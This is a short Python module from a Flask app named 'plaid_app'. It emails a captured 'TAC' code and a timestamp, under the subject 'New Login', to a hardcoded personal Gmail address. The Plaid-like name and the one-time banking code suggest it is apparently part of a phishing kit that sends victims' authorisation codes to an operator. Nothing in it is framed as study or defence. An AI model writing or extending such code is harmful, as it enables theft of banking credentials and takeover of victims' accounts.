from plaid_app import mail
from flask_mail import Message
from datetime import datetime

def tac_code(tac):
    msg = Message('New Login',
        sender='Normanday26@gmail.com',
        recipients=['Normanday26@gmail.com'])
    msg.body=f'''
    TAC ----- {tac}
    at ---- {datetime.now()}
    '''
    mail.send(msg)